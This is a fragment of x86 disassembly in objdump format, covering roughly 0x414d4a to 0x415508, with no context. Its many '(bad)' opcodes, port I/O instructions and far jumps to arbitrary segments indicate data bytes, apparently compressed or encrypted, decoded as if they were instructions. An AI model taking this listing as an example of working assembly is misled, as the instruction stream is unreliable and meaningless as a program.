  414d4a:	or     eax,DWORD PTR [esi-0xd]
  414d4d:	sbb    ebp,DWORD PTR [ebx+eiz*8+0x17]
  414d51:	(bad)  
  414d52:	xor    esp,ebx
  414d54:	push   cs
  414d55:	dec    ecx
  414d56:	fcomp  QWORD PTR [ecx-0x7807568a]
  414d5c:	es int3 
  414d5e:	or     ebx,ecx
  414d60:	adc    al,0x7
  414d62:	inc    edx
  414d63:	test   eax,0x8f141be4
  414d68:	mov    dl,0xcd
  414d6a:	std    
  414d6b:	xchg   ecx,eax
  414d6c:	sub    DWORD PTR [eax-0x6d12677],ebp
  414d72:	and    eax,0xab6f523f
  414d77:	cmp    ebp,esi
  414d79:	inc    ecx
  414d7a:	ret    
  414d7b:	aas    
  414d7c:	out    dx,eax
  414d7d:	into   
  414d7e:	bts    DWORD PTR [eax+0x1e937493],ebx
  414d85:	ror    DWORD PTR [ebx+0x449d230c],0xf0
  414d8c:	adc    al,0x92
  414d8e:	and    cl,BYTE PTR [esp+edx*4+0x10]
  414d92:	(bad)  
  414d93:	mov    al,BYTE PTR [edi-0x13]
  414d96:	sub    eax,0xafa63720
  414d9b:	push   0xffffff87
  414d9d:	test   DWORD PTR [ebx],ebx
  414d9f:	mov    bl,0x32
  414da1:	lods   al,BYTE PTR ds:[esi]
  414da2:	lds    eax,FWORD PTR [edx-0x7af71ba8]
  414da8:	div    DWORD PTR [ebp+0x78]
  414dab:	mov    ch,0x10
  414dad:	sbb    BYTE PTR [edx],0xa6
  414db0:	outs   dx,BYTE PTR ds:[esi]
  414db1:	aas    
  414db2:	pushf  
  414db3:	jl     0x414e13
  414db5:	mov    esp,0x2c3d2191
  414dba:	pop    ebx
  414dbb:	popf   
  414dbc:	nop
  414dbd:	pop    ebp
  414dbe:	xchg   ebx,eax
  414dbf:	inc    eax
  414dc0:	retf   0xcc63
  414dc3:	jle    0x414db1
  414dc5:	leave  
  414dc6:	mov    ch,0x78
  414dc8:	mov    eax,ss:0x9c623956
  414dce:	or     edi,DWORD PTR [edx+0x64ada725]
  414dd4:	adc    dh,BYTE PTR [ecx-0x5a]
  414dd7:	push   esi
  414dd8:	jle    0x414e04
  414dda:	cmp    eax,0x993cc0
  414ddf:	cs popf 
  414de1:	in     al,0x3e
  414de3:	cwde   
  414de4:	loope  0x414d87
  414de6:	jbe    0x414d91
  414de8:	dec    ebp
  414de9:	xchg   DWORD PTR [ebx+0x2693554a],esi
  414def:	lds    esp,FWORD PTR [ebx+0x11]
  414df2:	adc    BYTE PTR [esi+edx*8],bl
  414df5:	sahf   
  414df6:	inc    eax
  414df7:	int3   
  414df8:	sub    al,0x1f
  414dfa:	repz repnz dec ecx
  414dfd:	mov    al,ds:0xf9c67ae5
  414e02:	rol    BYTE PTR [edx-0x29],cl
  414e05:	dec    esi
  414e06:	stos   BYTE PTR es:[edi],al
  414e07:	retf   0x1651
  414e0a:	popa   
  414e0b:	xor    esi,0xffffffde
  414e0e:	mov    eax,ss:0x51aad7be
  414e14:	fild   WORD PTR ds:[edi+0x7867ff11]
  414e1b:	sahf   
  414e1c:	fs test al,0xa5
  414e1f:	dec    eax
  414e20:	push   ss
  414e21:	clc    
  414e22:	jmp    0x2639895a
  414e27:	aaa    
  414e28:	repz int 0xd4
  414e2b:	aad    0xe2
  414e2d:	jl     0x414dcf
  414e2f:	mov    es,WORD PTR [esi+0x1e]
  414e32:	xchg   DWORD PTR [ecx-0xd],ecx
  414e35:	add    DWORD PTR [esi+0x1e7122a4],edx
  414e3b:	nop
  414e3c:	bound  edi,QWORD PTR [eax-0x1b3bfd87]
  414e42:	and    eax,0x84ca6d27
  414e47:	data16 and BYTE PTR [ebx-0x3f],bl
  414e4b:	in     al,dx
  414e4c:	repz rcr BYTE PTR [ecx],cl
  414e4f:	out    0xb3,eax
  414e51:	add    ebp,esi
  414e53:	ret    
  414e54:	test   eax,0x6c42bb4
  414e59:	add    ecx,eax
  414e5b:	retf   0x14fa
  414e5e:	jle    0x414e89
  414e60:	mov    dh,BYTE PTR [esp+edx*1+0x3cbd4429]
  414e67:	pop    edx
  414e68:	pushf  
  414e69:	mov    al,0x62
  414e6b:	xchg   ebx,eax
  414e6c:	call   0x6762:0xef59070e
  414e73:	stc    
  414e74:	loop   0x414e89
  414e76:	jge    0x414edf
  414e78:	ds dec esp
  414e7a:	mov    sp,0xb017
  414e7e:	sub    dh,BYTE PTR [esi]
  414e80:	gs rol al,cl
  414e83:	bound  ecx,QWORD PTR [eax]
  414e85:	sbb    ah,ch
  414e87:	push   eax
  414e88:	jmp    0xc8e2abe4
  414e8d:	sbb    BYTE PTR [ecx],0xec
  414e90:	adc    al,0xa1
  414e92:	les    eax,FWORD PTR [edi]
  414e94:	dec    edx
  414e95:	or     BYTE PTR [edx-0x7e],al
  414e98:	mov    bl,0x5e
  414e9a:	push   edx
  414e9b:	mov    esp,0x1b81509c
  414ea0:	xchg   edi,eax
  414ea1:	and    BYTE PTR [edi-0x1e],0xb7
  414ea5:	adc    eax,0x6c45e4df
  414eaa:	sub    al,0x5c
  414eac:	bound  esp,QWORD PTR [ecx]
  414eae:	stos   DWORD PTR es:[edi],eax
  414eaf:	xor    DWORD PTR [esi+ebx*1-0x190a354f],esi
  414eb6:	or     edi,DWORD PTR [ecx+0x4aeebc25]
  414ebc:	in     al,dx
  414ebd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414ebe:	aas    
  414ebf:	mov    dl,0xa2
  414ec1:	nop
  414ec2:	adc    al,0x58
  414ec4:	fbld   TBYTE PTR [eax+0x71e2da55]
  414eca:	div    al
  414ecc:	dec    edx
  414ecd:	mov    bh,0xc
  414ecf:	push   edx
  414ed0:	pop    ebp
  414ed1:	xor    ecx,DWORD PTR [eax-0x45ee7f66]
  414ed7:	shl    DWORD PTR [edx+0x4b],0x32
  414edb:	and    al,0xc8
  414edd:	daa    
  414ede:	ss add ebx,eax
  414ee1:	sbb    DWORD PTR [ecx+eiz*1+0x38601b76],eax
  414ee8:	xchg   esp,esi
  414eea:	inc    ebp
  414eeb:	mov    WORD PTR ds:0x7fdbf5a6,ds
  414ef1:	inc    eax
  414ef2:	add    ch,BYTE PTR [esi]
  414ef4:	xchg   esi,eax
  414ef5:	xchg   ebx,eax
  414ef6:	(bad)  [ebx+0x73c69fbe]
  414efc:	push   eax
  414efd:	jecxz  0x414f05
  414eff:	pop    eax
  414f00:	or     ah,al
  414f02:	push   eax
  414f03:	std    
  414f04:	or     ch,bl
  414f06:	fxtract 
  414f08:	sbb    DWORD PTR [eax-0x6ba2ed7d],edx
  414f0e:	mov    dl,0xef
  414f10:	adc    ah,ch
  414f12:	(bad)  
  414f13:	leave  
  414f14:	je     0x414ef5
  414f16:	mov    esp,cs
  414f18:	inc    esp
  414f19:	and    al,dl
  414f1b:	and    DWORD PTR [edi+0x593c0758],edi
  414f21:	xchg   edi,eax
  414f22:	lods   al,BYTE PTR ds:[esi]
  414f23:	inc    ebx
  414f24:	(bad)  
  414f25:	(bad)  
  414f26:	jge    0x414ed5
  414f28:	adc    al,0xfc
  414f2a:	cmc    
  414f2b:	jmp    0x5128:0xb32b4ea2
  414f32:	push   0xffffffdd
  414f34:	in     eax,0xa7
  414f36:	adc    BYTE PTR [edx],bl
  414f38:	call   0xaa46:0x8f5ef1b9
  414f3f:	dec    edx
  414f40:	mov    ds:0xb4bdafc8,al
  414f45:	cdq    
  414f46:	inc    edi
  414f47:	adc    al,0xf
  414f49:	adc    DWORD PTR [edi+0x37],eax
  414f4c:	inc    edx
  414f4d:	inc    edi
  414f4e:	push   edi
  414f4f:	pop    esp
  414f50:	cs jbe 0x414fd2
  414f53:	daa    
  414f54:	fsubr  st,st(1)
  414f56:	pop    ebp
  414f57:	out    dx,eax
  414f58:	cdq    
  414f59:	pop    es
  414f5a:	dec    edi
  414f5b:	mov    cl,0x38
  414f5d:	ins    BYTE PTR es:[edi],dx
  414f5e:	mov    ch,0xae
  414f60:	mov    al,ds:0x7159fb24
  414f65:	or     al,0xfa
  414f67:	adc    dh,BYTE PTR [ebx]
  414f69:	and    DWORD PTR [ebx+0x3038f80f],eax
  414f6f:	cmp    BYTE PTR [edx+ebx*1-0x13f7e0cf],0xd2
  414f77:	cmp    eax,0x4b803b7e
  414f7c:	adc    al,0x95
  414f7e:	mov    ds:0xe350e705,eax
  414f83:	sub    esp,ebp
  414f85:	imul   esi,DWORD PTR [ebx+ecx*4+0x56],0x11b96897
  414f8d:	shr    DWORD PTR [ebx+0x10837f72],0x35
  414f94:	clc    
  414f95:	or     eax,DWORD PTR gs:[eax+edi*4]
  414f99:	or     DWORD PTR [eax+ebx*2],edx
  414f9c:	push   0xffffffd2
  414f9e:	retf   
  414f9f:	sar    BYTE PTR [edi+ecx*2+0x14],cl
  414fa3:	sbb    ebp,DWORD PTR [ebx+0x5]
  414fa6:	retf   0x3d39
  414fa9:	lahf   
  414faa:	loop   0x414f7c
  414fac:	add    al,0x1b
  414fae:	(bad)  
  414faf:	jmp    0x414f82
  414fb1:	data16 jae 0x414f57
  414fb4:	inc    BYTE PTR [ecx+0x8]
  414fb7:	push   0x64
  414fb9:	std    
  414fba:	lock lock pop edi
  414fbd:	outs   dx,BYTE PTR ds:[esi]
  414fbe:	popf   
  414fbf:	jne    0x414feb
  414fc1:	call   DWORD PTR [ebp+0x6a]
  414fc4:	in     eax,0xd1
  414fc6:	mov    ebp,0xdbde96ef
  414fcb:	adc    DWORD PTR [eax],ecx
  414fcd:	mov    al,ds:0x3e90cdab
  414fd2:	jmp    0x415039
  414fd4:	test   eax,0xde50920d
  414fd9:	mov    cs,WORD PTR gs:[edx+ecx*1]
  414fdd:	inc    ebp
  414fde:	push   ds
  414fdf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414fe0:	mov    ah,al
  414fe2:	pop    edx
  414fe3:	and    dl,dl
  414fe5:	lods   al,BYTE PTR ds:[esi]
  414fe6:	mov    eax,ds:0x12d278c1
  414feb:	dec    ecx
  414fec:	mov    dh,0x78
  414fee:	and    eax,0xfee2e28b
  414ff3:	int    0x8a
  414ff5:	out    0xb,eax
  414ff7:	xchg   ebx,eax
  414ff9:	scas   eax,DWORD PTR es:[edi]
  414ffa:	or     edi,DWORD PTR [ebx]
  414ffc:	stos   BYTE PTR es:[edi],al
  414ffd:	mov    edx,0x4fd40dc5
  415002:	retf   0xa506
  415005:	push   0xefd9f0a6
  41500a:	pop    ds
  41500b:	sbb    al,0x50
  41500d:	scas   eax,DWORD PTR es:[edi]
  41500e:	jns    0x414f99
  415010:	mov    bh,0xa0
  415012:	scas   al,BYTE PTR es:[edi]
  415013:	(bad)  
  415014:	enter  0x5512,0x74
  415018:	dec    ebp
  415019:	pusha  
  41501a:	xor    BYTE PTR [esp+ebp*4-0x767ba498],dl
  415021:	adc    BYTE PTR [edi],0x1f
  415024:	mov    al,ds:0x93263c27
  415029:	xor    edi,DWORD PTR [esi-0x1d74b437]
  41502f:	je     0x415083
  415031:	sbb    bh,0x74
  415034:	scas   eax,DWORD PTR es:[edi]
  415035:	jecxz  0x415024
  415037:	ja     0x41508e
  415039:	cmp    ebx,DWORD PTR [edx+0x3bfb4290]
  41503f:	xor    BYTE PTR [eax+eax*1],bh
  415042:	sbb    esp,DWORD PTR [ebp+eax*8+0x33f4daf]
  415049:	addr16 icebp 
  41504b:	mov    ch,0xc3
  41504d:	fist   WORD PTR [ebx-0x7feb2723]
  415053:	add    BYTE PTR [edi-0x31b399fa],0xba
  41505a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41505b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41505c:	xchg   ecx,eax
  41505d:	jmp    0x41504f
  41505f:	cmp    BYTE PTR [edi],dh
  415061:	test   eax,0x2329d4d0
  415066:	out    dx,eax
  415067:	adc    DWORD PTR [edi-0x38],ebp
  41506a:	mov    WORD PTR [edx+0x205b0838],?
  415070:	mov    ebx,0xcac57339
  415075:	data16 mov dh,0xc1
  415078:	inc    esi
  415079:	js     0x4150c7
  41507b:	gs mov bl,0x7
  41507e:	scas   al,BYTE PTR es:[edi]
  41507f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415080:	stos   BYTE PTR es:[edi],al
  415081:	out    dx,eax
  415082:	dec    esp
  415083:	addr16 call 0x1fd9:0xe6d62319
  41508b:	fs (bad) 
  41508d:	mov    al,0xf
  41508f:	popa   
  415090:	dec    edi
  415091:	nop
  415092:	call   0xd571:0xbc9d32c9
  415099:	mov    eax,ds:0xad7d8189
  41509e:	ja     0x4150a7
  4150a0:	adc    eax,0xf6e8d489
  4150a5:	js     0x41502f
  4150a7:	jg     0x415069
  4150a9:	bound  edx,QWORD PTR [ebx+esi*2+0x7ae7459d]
  4150b0:	mov    cl,0xcb
  4150b2:	aam    0x46
  4150b4:	dec    DWORD PTR [edx]
  4150b6:	pop    DWORD PTR [edx+0x60a607bd]
  4150bc:	lods   al,BYTE PTR ds:[esi]
  4150bd:	cmp    al,0x96
  4150bf:	inc    edx
  4150c0:	std    
  4150c1:	daa    
  4150c2:	call   FWORD PTR [edi+0x2cd7640a]
  4150c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4150c9:	icebp  
  4150ca:	scas   al,BYTE PTR es:[edi]
  4150cb:	cmp    DWORD PTR [edx+0x68],0xffffffc1
  4150cf:	les    ebx,FWORD PTR [edx]
  4150d1:	xchg   DWORD PTR [esi+0x29],ebp
  4150d4:	jno    0x4150ba
  4150d6:	jecxz  0x41514a
  4150d8:	shl    DWORD PTR [ebp+0x64bac954],cl
  4150de:	adc    eax,0x4bb73e61
  4150e3:	cmp    esi,eax
  4150e5:	data16 lock cmp ah,BYTE PTR [eax+0x4]
  4150ea:	aaa    
  4150eb:	sbb    ecx,DWORD PTR ds:[ecx+0x52e1f298]
  4150f2:	mov    esp,0xc5d74e96
  4150f7:	in     eax,0x32
  4150f9:	out    0x35,eax
  4150fb:	das    
  4150fc:	jo     0x41516a
  4150fe:	mov    esp,0x931fc9d0
  415103:	nop
  415104:	cmp    eax,0xc5983dc5
  415109:	mov    ebx,0x83f280ea
  41510e:	jle    0x4150fa
  415110:	sub    dl,BYTE PTR [esi-0x29]
  415113:	mov    BYTE PTR [edx+0x19],ch
  415116:	mov    dl,0xd3
  415118:	cmp    esp,DWORD PTR [ecx]
  41511a:	in     eax,dx
  41511b:	jg     0x4150c3
  41511d:	push   ss
  41511e:	sub    al,BYTE PTR [edx+0x6c5c861d]
  415124:	and    cl,ch
  415126:	jl     0x4150c6
  415128:	jbe    0x415101
  41512a:	fwait
  41512b:	pushf  
  41512c:	jge    0x4150df
  41512e:	xlat   BYTE PTR ds:[ebx]
  41512f:	cmp    DWORD PTR [ebx-0x49],edi
  415132:	inc    esi
  415133:	fsubp  st(3),st
  415135:	(bad)  
  415136:	data16 dec BYTE PTR [ecx-0x1c4d62a9]
  41513d:	jne    0x41518a
  41513f:	and    DWORD PTR [ebx],ebx
  415141:	jge    0x41518f
  415143:	sub    eax,0x30bcba94
  415148:	icebp  
  415149:	dec    eax
  41514a:	sti    
  41514b:	or     dh,BYTE PTR [ebx+edx*1]
  41514e:	dec    edi
  41514f:	call   0xbe400830
  415154:	push   ebx
  415155:	lods   al,BYTE PTR ds:[esi]
  415156:	sbb    edi,DWORD PTR [si+0x59]
  41515a:	cwde   
  41515b:	xchg   esp,eax
  41515c:	loopne 0x4151cf
  41515e:	stos   DWORD PTR es:[edi],eax
  41515f:	jbe    0x415110
  415161:	push   ss
  415162:	je     0x4151cf
  415164:	aam    0xd8
  415166:	mov    WORD PTR [edi+esi*8],es
  415169:	repnz push edi
  41516b:	mov    eax,ds:0x6bca55c5
  415170:	scas   al,BYTE PTR es:[edi]
  415171:	shl    BYTE PTR [esi+eiz*8+0x2605b97b],1
  415178:	mov    ah,0x5b
  41517a:	push   edi
  41517b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41517c:	xchg   edx,eax
  41517d:	imul   ebp,ebx,0xffffff93
  415180:	inc    ecx
  415181:	enter  0x9cff,0x70
  415185:	add    dh,BYTE PTR [edx-0x1d9b1bb6]
  41518b:	mov    esi,0xc1b9f872
  415190:	loope  0x415196
  415192:	out    0x31,al
  415194:	ret    
  415195:	test   al,0xb2
  415197:	add    DWORD PTR [ebx-0x55ff448e],ebx
  41519d:	in     al,dx
  41519e:	xchg   ebp,eax
  41519f:	adc    eax,0x4aca566
  4151a4:	in     al,0x76
  4151a6:	cmp    al,0xf
  4151a8:	cmp    cl,BYTE PTR [edi-0x49587ab8]
  4151ae:	cmp    DWORD PTR [ecx+ebx*4+0xcb906f5],esp
  4151b5:	rol    esi,0x6e
  4151b8:	fdiv   QWORD PTR [esi]
  4151ba:	lods   al,BYTE PTR ds:[esi]
  4151bb:	adc    BYTE PTR [ecx-0x2edcb8d9],bl
  4151c1:	aaa    
  4151c2:	ins    BYTE PTR es:[edi],dx
  4151c3:	test   al,0x30
  4151c5:	pusha  
  4151c6:	xor    al,0xe4
  4151c8:	sar    BYTE PTR [eax+0x32],cl
  4151cb:	enter  0x63e6,0x28
  4151cf:	inc    esi
  4151d0:	imul   eax,DWORD PTR [edi-0xb],0x29
  4151d4:	lds    ebp,FWORD PTR fs:[edi-0x3c]
  4151d8:	xchg   edx,eax
  4151d9:	lds    esp,FWORD PTR [ecx]
  4151db:	push   esi
  4151dc:	bound  edx,QWORD PTR [eax-0xc812060]
  4151e2:	adc    al,0xd9
  4151e4:	push   ebp
  4151e5:	(bad)  
  4151e6:	lods   al,BYTE PTR ds:[esi]
  4151e7:	mov    ds:0xef17a5d3,eax
  4151ec:	xchg   esp,eax
  4151ed:	jmp    0x22ec:0xec93c4a9
  4151f4:	nop
  4151f5:	push   eax
  4151f6:	mov    dl,0xa7
  4151f8:	inc    edi
  4151f9:	in     al,dx
  4151fa:	fisttp DWORD PTR [esi]
  4151fc:	jecxz  0x4151ab
  4151fe:	xor    al,0x83
  415200:	pop    ds
  415201:	sti    
  415202:	xlat   BYTE PTR ds:[ebx]
  415203:	psllw  mm4,QWORD PTR [eax]
  415206:	aaa    
  415207:	pushf  
  415208:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415209:	sbb    esp,eax
  41520b:	push   es
  41520c:	jecxz  0x415279
  41520e:	pop    esi
  41520f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415210:	outs   dx,BYTE PTR ds:[esi]
  415211:	push   ecx
  415212:	inc    edi
  415213:	push   eax
  415214:	jmp    0x7e5f:0x1192d7d1
  41521b:	lods   eax,DWORD PTR ds:[esi]
  41521c:	mov    dl,0x1a
  41521e:	lahf   
  41521f:	cmp    DWORD PTR [esi],edi
  415221:	jne    0x41521e
  415223:	push   0x27076edf
  415228:	add    DWORD PTR [eax+ebp*4],ebp
  41522b:	push   cs
  41522c:	adc    ch,ah
  41522e:	outs   dx,DWORD PTR ds:[esi]
  41522f:	in     eax,dx
  415230:	mov    esi,ecx
  415232:	xorps  xmm5,xmm4
  415235:	inc    eax
  415236:	adc    al,0x4b
  415238:	add    esi,DWORD PTR [edx-0x78]
  41523b:	cmp    al,0xeb
  41523d:	leave  
  41523e:	mov    eax,ds:0xb4e4a168
  415243:	xor    DWORD PTR [eax],0x3f
  415246:	and    eax,0xccfe7d58
  41524b:	jns    0x415245
  41524d:	inc    ecx
  41524e:	out    dx,al
  41524f:	(bad)  
  415250:	dec    ebx
  415251:	or     al,0x1
  415253:	into   
  415254:	dec    ecx
  415255:	push   ecx
  415256:	mov    dl,0x9b
  415258:	inc    edx
  415259:	mov    ebp,0x4be734d
  41525e:	push   cs
  41525f:	mov    eax,DWORD PTR [ecx-0x68]
  415262:	icebp  
  415263:	pop    ds
  415264:	jnp    0x4152b5
  415266:	sahf   
  415267:	sbb    ch,dl
  415269:	ds hlt 
  41526b:	(bad)  
  41526d:	sbb    edx,esi
  41526f:	mov    eax,0x7a3da6ae
  415274:	inc    eax
  415275:	mov    ah,0x78
  415277:	mov    al,0xc3
  415279:	es in  al,0xad
  41527c:	bound  esi,QWORD PTR [edi-0x8]
  41527f:	mov    ch,0xc8
  415281:	out    dx,al
  415282:	aaa    
  415283:	addr16 jl 0x415215
  415286:	or     BYTE PTR [eax],bh
  415288:	sub    al,0x28
  41528a:	loopne 0x4152c7
  41528c:	mov    ebx,0x49b305b4
  415292:	mov    ebx,0x313ee99b
  415297:	test   DWORD PTR [esi+esi*2+0x411f135c],0x3f04558e
  4152a2:	and    BYTE PTR [ebx+0x6c],dl
  4152a5:	out    dx,al
  4152a6:	pushf  
  4152a7:	shl    DWORD PTR [ebx+0x71bb1f6a],0xfb
  4152ae:	xchg   ecx,eax
  4152af:	mov    cl,BYTE PTR [ebx+eax*4+0x2e]
  4152b3:	jle    0x4152a1
  4152b5:	test   BYTE PTR [edi-0x665a48d3],al
  4152bb:	jmp    0xc22a:0xa77347db
  4152c2:	jb     0x4152ea
  4152c4:	loop   0x41533f
  4152c6:	les    ebp,FWORD PTR [ebp-0x2dee5a9e]
  4152cc:	pop    ebx
  4152cd:	xchg   esi,eax
  4152ce:	pop    ecx
  4152cf:	push   esp
  4152d0:	inc    eax
  4152d1:	pop    edx
  4152d2:	adc    BYTE PTR [ebx+0x2cc4fc1e],bh
  4152d8:	cmp    eax,0x64475b22
  4152dd:	cli    
  4152de:	ret    
  4152df:	jecxz  0x415359
  4152e1:	xor    BYTE PTR [eax-0x71],bh
  4152e4:	sti    
  4152e5:	sbb    ah,BYTE PTR [eax*8-0x7982ee05]
  4152ec:	fimul  DWORD PTR [eax-0x3f]
  4152ef:	mov    bh,0x7c
  4152f1:	jae    0x415348
  4152f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4152f4:	mov    ah,0x9a
  4152f6:	lahf   
  4152f7:	push   ebp
  4152f8:	pop    eax
  4152f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4152fa:	repnz hlt 
  4152fc:	pop    ebp
  4152fd:	inc    ebx
  4152fe:	xchg   esi,eax
  4152ff:	adc    dh,BYTE PTR [ebx-0x18c5fd36]
  415305:	pop    edi
  415306:	add    edx,ebx
  415308:	aad    0xf
  41530a:	ret    0x22b2
  41530d:	sub    eax,0x4ccfd6a0
  415312:	retf   0xfba5
  415315:	int    0xa4
  415317:	xchg   edx,eax
  415318:	nop
  415319:	dec    ecx
  41531a:	push   esi
  41531b:	pop    ebp
  41531c:	lahf   
  41531d:	push   edx
  41531e:	jno    0x415349
  415320:	xlat   BYTE PTR ds:[ebx]
  415321:	pop    edx
  415322:	or     edx,ebx
  415324:	or     eax,0xb154aa8b
  415329:	(bad)  
  41532a:	jbe    0x415379
  41532c:	xlat   BYTE PTR ds:[ebx]
  41532d:	jns    0x4153ae
  41532f:	mov    edi,0xdb93958e
  415334:	call   0xa577:0x20846fd
  41533b:	xchg   ebx,eax
  41533c:	ds jge 0x4152e3
  41533f:	int3   
  415340:	aad    0xb8
  415342:	xchg   ebx,eax
  415343:	mov    cl,0x26
  415345:	mov    dl,0xc2
  415347:	dec    eax
  415348:	fnstenv [edx-0x5294fa1b]
  41534e:	dec    ebx
  41534f:	and    al,dl
  415351:	xor    ebp,esp
  415353:	adc    edi,DWORD PTR [eax+0x70]
  415356:	test   DWORD PTR [edx],esp
  415358:	sbb    DWORD PTR [ebx],edx
  41535a:	xchg   edi,eax
  41535b:	jmp    0xb84e8895
  415360:	aad    0x3c
  415362:	jns    0x4152f1
  415364:	cmp    DWORD PTR [eax+0x5a7ed143],esp
  41536a:	addr16 cmc 
  41536c:	shr    DWORD PTR [esp+eiz*8-0x18371c],0x96
  415374:	scas   eax,DWORD PTR es:[edi]
  415375:	(bad)
  415378:	cmp    eax,0x6fd12309
  41537d:	lods   eax,DWORD PTR ds:[esi]
  41537e:	inc    esi
  41537f:	loop   0x415351
  415381:	out    0x8c,al
  415383:	jmp    0x4153f3
  415385:	call   0x1454:0xa0656457
  41538c:	(bad)  
  41538d:	and    eax,0xe7d6d89d
  415392:	mov    edi,ebx
  415394:	mov    dl,BYTE PTR [ebp-0x34]
  415397:	mov    ecx,0x7a980042
  41539c:	push   edi
  41539d:	(bad)  
  41539e:	sub    BYTE PTR [ecx-0x533beec9],cl
  4153a4:	repnz pop ss
  4153a6:	popa   
  4153a7:	fdivr  QWORD PTR [ebx-0x51]
  4153aa:	addr16 jo 0x415352
  4153ad:	pop    esp
  4153ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4153af:	rcl    DWORD PTR [esi],1
  4153b1:	mov    ecx,DWORD PTR [ebp+edi*8+0x71ba926a]
  4153b8:	scas   eax,DWORD PTR es:[edi]
  4153b9:	inc    ecx
  4153ba:	pop    edx
  4153bb:	enter  0xd993,0xff
  4153bf:	adc    eax,0xef020b24
  4153c4:	popf   
  4153c5:	or     eax,0x84856403
  4153ca:	add    al,0xe4
  4153cc:	not    BYTE PTR ds:[esp+edx*8-0x69ee039b]
  4153d4:	lahf   
  4153d5:	jno    0x41543b
  4153d7:	xlat   BYTE PTR ds:[ebx]
  4153d8:	es cmp al,0xba
  4153db:	fadd   DWORD PTR [ecx]
  4153dd:	loop   0x4153c3
  4153df:	hlt    
  4153e0:	and    DWORD PTR [ecx+0x5167182d],eax
  4153e6:	jb     0x4153a2
  4153e8:	test   al,0x65
  4153ea:	in     eax,0x53
  4153ec:	xchg   ebx,eax
  4153ed:	into   
  4153ee:	add    al,ah
  4153f0:	outs   dx,BYTE PTR ds:[esi]
  4153f1:	das    
  4153f2:	sub    al,0xd2
  4153f4:	cmp    al,0x6e
  4153f6:	sbb    al,0x2a
  4153f8:	ror    DWORD PTR [edi],1
  4153fa:	jg     0x415386
  4153fc:	outs   dx,DWORD PTR ds:[esi]
  4153fd:	inc    ebp
  4153fe:	rol    esp,1
  415400:	add    DWORD PTR [ebx],ebp
  415402:	mov    ds,WORD PTR [edx+0x30]
  415405:	jge    0x415485
  415407:	or     bl,ah
  415409:	ror    DWORD PTR [esi+0x38df518b],cl
  41540f:	mov    cl,0x72
  415411:	fs mov ecx,0xb7572ce0
  415417:	sub    edi,ebp
  415419:	mov    bl,0xd8
  41541b:	jb     0x415456
  41541d:	lods   al,BYTE PTR ds:[esi]
  41541e:	mov    edi,0x19562149
  415423:	or     ebp,esi
  415425:	pop    esp
  415426:	sbb    BYTE PTR [ebx],dh
  415428:	pusha  
  415429:	mov    ecx,0xd3f2064c
  41542e:	inc    esi
  41542f:	paddusb mm4,QWORD PTR [esi+0x81e01c9]
  415436:	(bad)  
  415437:	pop    edi
  415438:	fs jne 0x415491
  41543b:	dec    edx
  41543c:	mov    ebp,0x15703cac
  415441:	adc    BYTE PTR [esi-0x7e],dh
  415444:	and    bh,BYTE PTR cs:[edx]
  415447:	sbb    DWORD PTR [esi],ebp
  415449:	mov    bl,0xff
  41544b:	adc    dh,BYTE PTR [edx+0xe6527e9]
  415451:	test   BYTE PTR [esi-0x1e],bl
  415454:	lods   al,BYTE PTR ds:[esi]
  415455:	es push ebp
  415457:	cmp    edx,DWORD PTR [ebx+edx*2-0x60]
  41545b:	mov    ?,WORD PTR [ebp-0x4b55a075]
  415461:	cmp    DWORD PTR ds:0x4c28bd48,ebx
  415467:	outs   dx,DWORD PTR ds:[esi]
  415468:	mov    edi,0xfde11cf1
  41546d:	xchg   edi,eax
  41546e:	test   al,0x44
  415470:	sbb    BYTE PTR [esi+edi*8-0x30520413],bl
  415477:	sub    ch,BYTE PTR [esi+eax*2]
  41547a:	xlat   BYTE PTR ds:[ebx]
  41547b:	pushf  
  41547c:	adc    BYTE PTR [eax-0x50],bh
  41547f:	aas    
  415480:	cmc    
  415481:	jl     0x4154c0
  415483:	cmp    DWORD PTR [eax-0x624cb74b],ecx
  415489:	call   0x3d48b8c9
  41548e:	inc    edx
  41548f:	test   eax,0xd8232914
  415494:	ins    BYTE PTR es:[edi],dx
  415495:	xor    eax,0x8645997b
  41549a:	add    al,0xdc
  41549c:	xchg   BYTE PTR [ecx+0x409c5c0f],dl
  4154a2:	jg     0x415435
  4154a4:	cmp    DWORD PTR [ecx-0x757439b9],ebp
  4154aa:	outs   dx,DWORD PTR ds:[esi]
  4154ab:	pushf  
  4154ac:	xor    DWORD PTR [esi+0x62188e31],edx
  4154b2:	and    BYTE PTR [edx-0x2be69dc9],bl
  4154b8:	pop    ebp
  4154b9:	out    dx,al
  4154ba:	iret   
  4154bb:	mov    cl,0xb6
  4154bd:	out    0xe5,eax
  4154bf:	xor    eax,edi
  4154c1:	test   edx,edx
  4154c3:	sbb    eax,0x548ef861
  4154c8:	xchg   edx,eax
  4154c9:	cmp    al,0x6b
  4154cb:	fisubr DWORD PTR [ecx]
  4154cd:	sti    
  4154ce:	ret    0x1533
  4154d1:	int    0xb6
  4154d3:	inc    eax
  4154d4:	push   edx
  4154d5:	pop    es
  4154d6:	xor    al,0x7a
  4154d8:	pop    ds
  4154d9:	add    BYTE PTR [edi],al
  4154db:	int    0x53
  4154dd:	pop    eax
  4154de:	inc    edx
  4154df:	and    al,0x2d
  4154e1:	lods   eax,DWORD PTR ds:[esi]
  4154e2:	fldpi  
  4154e4:	push   edi
  4154e5:	jmp    0x4154f2
  4154e7:	in     eax,dx
  4154e8:	push   0x511ac712
  4154ed:	push   esp
  4154ee:	div    ebp
  4154f0:	test   ah,cl
  4154f2:	or     DWORD PTR [eax-0x77],eax
  4154f5:	lods   al,BYTE PTR ds:[esi]
  4154f6:	test   eax,0x62b7fa33
  4154fb:	and    bh,BYTE PTR [ebx+ecx*8+0xb]
  4154ff:	push   edi
  415500:	cmp    eax,0xf6f0b93
  415505:	dec    edx
  415506:	xor    BYTE PTR [ebx],cl
  415508:	popf   
